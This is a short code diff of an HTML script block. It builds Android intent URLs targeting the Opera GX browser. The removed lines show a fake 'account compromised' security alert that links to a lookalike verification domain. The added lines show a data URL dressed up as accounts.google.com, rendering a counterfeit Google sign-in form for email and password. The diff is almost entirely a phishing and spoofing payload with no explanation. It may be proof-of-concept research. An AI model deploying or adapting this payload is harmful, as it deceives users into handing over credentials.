@@ -1,10 +1,16 @@
 <script>
-const securityAlertIntent = 
+const fakeLoginIntent = 
 "intent://vtp.operagx.gg/?url=" +
-"data://security.alert.opera.com/," +
-"SECURITY ALERT%0a%0d%0a%0d" +
-"Your Opera account has been compromised.%0a%0d" +
-"Immediate action required:%0a%0d" +
-"https://opera-security-verify.com" +
-"#Intent;scheme=https;category=android.intent.category.BROWSABLE;package=com.opera.gx;S.browser_fallback_url=;end";
+"data://accounts.google.com/," +
+encodeURIComponent(`
+<html>
+<body style="font-family: Arial; text-align: center; padding: 50px;">
+    <h1>🔒 Google Sign-in</h1>
+    <input type="email" placeholder="Email"><br>
+    <input type="password" placeholder="Password"><br>
+    <button>Sign in</button>
+</body>
+</html>
+`) +
+"#Intent;scheme=https;category=android.intent.category.BROWSABLE;package=com.opera.gx;end";
 </script>
